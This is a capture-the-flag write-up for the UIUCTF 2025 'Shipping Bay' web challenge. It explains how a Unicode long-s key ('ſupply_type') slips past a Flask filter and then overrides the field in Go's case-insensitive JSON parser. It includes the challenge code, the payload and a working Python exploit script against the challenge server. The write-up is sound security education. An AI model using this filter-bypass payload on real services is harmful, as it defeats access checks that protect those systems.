---
title: UIUCTF 2025 - Shipping Bay
date: 2025-07-30
lastmod: 2025-07-30T13:00:30+02:00
categories:
  - writeup
  - uiuctf25
tags:
  - web
  - python
  - go
  - Parser-differential
  - medium
authors:
  - Valenter
---
*UPS lost my package, so I'm switching to a more reliable carrier.*

Here we are in Chapter Three of our Cyberspace Odyssey for uiuctf; this time, we are tasked with retrieving a particular cosmic cargo that got lost during astral shipping.

![Homepage](/uiuctf2025/shipping-bay/screenshot-1.png)

A real flashback to the future with its Y2K/Vaporwave Classic Windows 98 UI, proof that even in the space age, fashion remains cyclical.

## Unpacking the interplanetary cargo

Let's try to create a new shipment.

![shipping](/uiuctf2025/shipping-bay/screenshot-2.png)

We can pick from a variety of options here, but it doesn't really matter, the space courier will always lose our package

```http
https://shipping-bay.chal.uiuc.tf/?status=oops+we+lost+the+package
```

Prodding at the code, there doesn't seem to be much we can work with, this debugging flag looks interesting at first:

```python
if __name__ == '__main__':
	app.run(debug=True)
```

but it's merely a red herring, we have no way of triggering the Werkzeug debug console.

Among the various supply types, there is one that piques our interest:

```go
//main.go
func sendShipment(shipment Shipment) string {
    if shipment.SupplyType == "flag" {
        if flag, exists := os.LookupEnv("FLAG"); exists {
            return flag
        }
        return "uiuctf{fake_flag}"
    }
    return "oops we lost the package"
}
```

But in order to retrieve our package, we first have to go through two different checks, this one in Go and the first one in `index.py`:

```python
def create_shipment():
    shipment_data = {k.lower(): v for k, v in request.form.items()}

    if shipment_data['supply_type'] == "flag":
        return "Error: Invalid supply type", 400

    shipment_status = subprocess.check_output(["/home/user/processing_service", json.dumps(shipment_data)]).decode().strip()

    return redirect(url_for('index', status=shipment_status))
```

Flask collects all submitted fields into a dict, lowercasing each key, so we can't simply enter two identical `supply_type` parameters or use capital letters to trick it into accepting our input.

Note, however, that this still allows us to enter two different `supply_type` fields in our input, as long as the second one is worded ever-so-*slightly* differently.

But how can we bypass it while ensuring that Go still reads a properly formatted `supply_type = flag` from the resulting Json?

## Resistance is futile

Thankfully, my teammate Leonardo came to the rescue and found [this article](https://blog.trailofbits.com/2025/06/17/unexpected-security-footguns-in-gos-parsers/#case-insensitive-key-matching) that mentions this exact scenario.

We are going to use this character: `ſ` (Latin small long‑s, U+017F, unchanged by `.lower()`), which enables us to construct our final **payload**:

```python
    form = [
        ("origin",       uid),               # tutti i campi “normali”
        ("destination",  "Luna City"),
        ("weight",       "1 ton"),
        ("priority",     "Low"),
        ("vessel",       "USS Tomorrow"),
        ("supply_type",  "Tools"),           # passa il filtro Python
        ("ſupply_type",   "flag"),            # secondo campo → debug
    ]
``` 

But **what** is going on under the hood?

On the **Python** side, only the ASCII‐key `"supply_type"` is checked, with our payload the ASCII key is still `"Tools"`, so this check passes.

```python
json.dumps(shipment_data)
subprocess.check_output(["/home/user/processing_service", json.dumps(shipment_data)])
```

Json marshalling turns the payload into:

```json
{
  "origin":"…",
  …,
  "supply_type":"Tools",
  "ſupply_type":"flag"
}
```
*note that both keys appear distinctly*

On the **Go** (processing_service) side:

- Go’s JSON unmarshaller scans keys in order and, upon each match, sets the struct field
```go
type Shipment struct {
    …  
    SupplyType string `json:"supply_type"`
    …  
}
```
- It matches keys using **Unicode case‑folding** (`strings.EqualFold`), which maps both ASCII “s” and the long‑s “ſ” to the same fold class “s”.
- Therefore:

	1. On seeing `"supply_type":"Tools"`, it sets `SupplyType = "Tools"`.
    
	2. On seeing `"ſupply_type":"flag"`, it also matches the same field (since “ſ” folds to “s”) and overwrites it with `"flag"`
This gives rise to a sort of pseudo-homographic **parser differential** attack.

#### Final script
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import re, uuid, requests
from urllib.parse import unquote_plus

BASE   = "https://shipping-bay.chal.uiuc.tf/"
CREATE = f"{BASE}/create_shipment"

def pretty(loc):
    if not loc:
        return None
    decoded = unquote_plus(loc)
    print("\n───── Location (decoded) ─────")
    for line in decoded.splitlines():
        print("│", line)
    print("───────────────────────────────")
    m = re.search(r"uiuctf\{[^}]+\}", decoded)
    return m.group(0) if m else None

def main():
    uid = f"Earth‑{uuid.uuid4()}"
    form = [
        ("origin",       uid),               
        ("destination",  "Luna City"),
        ("weight",       "1 ton"),
        ("priority",     "Low"),
        ("vessel",       "USS Tomorrow"),
        ("supply_type",  "Tools"),           #passes Python filter
        ("ſupply_type",   "flag"),           #second field - passes Go's parser
    ]

    r = requests.post(CREATE, data=form, allow_redirects=False, timeout=5)
    print(f"[+] HTTP {r.status_code}")
    for k, v in r.headers.items():
        print(f"    {k}: {v}")

    flag = pretty(r.headers.get("Location", ""))
    print("\n[+] FLAG:", flag or "not found")

if __name__ == "__main__":
    main()
```
### ALL YOUR FLAGS ARE BELONG TO US

**`uiuctf{maybe_we_should_check_schemas_8e229f}`**